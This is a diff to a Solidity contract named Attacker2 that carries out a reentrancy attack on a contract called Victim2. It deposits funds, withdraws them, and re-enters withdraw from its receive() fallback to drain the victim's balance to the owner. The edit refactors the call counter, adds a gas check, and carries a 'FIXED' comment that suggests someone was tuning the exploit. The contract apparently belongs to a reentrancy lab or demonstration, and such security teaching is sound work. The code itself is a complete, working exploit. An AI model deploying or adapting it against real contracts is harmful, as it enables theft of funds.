@@ -6,39 +6,36 @@ import "./Victim2.sol";
 contract Attacker2 {
     Victim2 public victim;
     address public owner;
-
     uint256 public withdrawAmount;
-    uint256 public numCalls;
-    uint256 public callCount;
+    uint256 public remainingCalls;
 
-    constructor(address _victim) {
-        victim = Victim2(_victim);
+    constructor(address payable _victim) {
+        victim = Victim2(payable(_victim));
         owner = msg.sender;
     }
 
-    receive() external payable {
-        if (
-            callCount < numCalls &&
-            address(victim).balance >= withdrawAmount &&
-            victim.balances(address(this)) >= withdrawAmount
-        ) {
-            callCount++;
-            victim.withdraw(withdrawAmount);
-        }
-    }
-
-    function initiateAttack(uint256 _amount, uint256 _calls) external payable {
+    function initiateAttack(uint256 _withdrawAmount, uint256 _calls) external payable {
         require(msg.sender == owner, "Only owner");
-        withdrawAmount = _amount;
-        numCalls = _calls;
-        callCount = 0;
-
+        
+        withdrawAmount = _withdrawAmount;
+        remainingCalls = _calls;
+        
+        // Deposit the initial funds to establish a balance
         victim.deposit{value: msg.value}();
-        victim.withdraw(_amount);
+        
+        // Start the reentrancy attack
+        victim.withdraw(_withdrawAmount);
     }
 
-    function withdrawProfit() external {
+    function withdrawFunds() external {
         require(msg.sender == owner, "Only owner");
         payable(owner).transfer(address(this).balance);
+    }
+
+    receive() external payable {
+        if (remainingCalls > 1 && address(victim).balance >= withdrawAmount && gasleft() > 50000) {
+            remainingCalls--;
+            victim.withdraw(withdrawAmount); // ✅ FIXED: Use consistent withdrawal amount
+        }
     }
 }
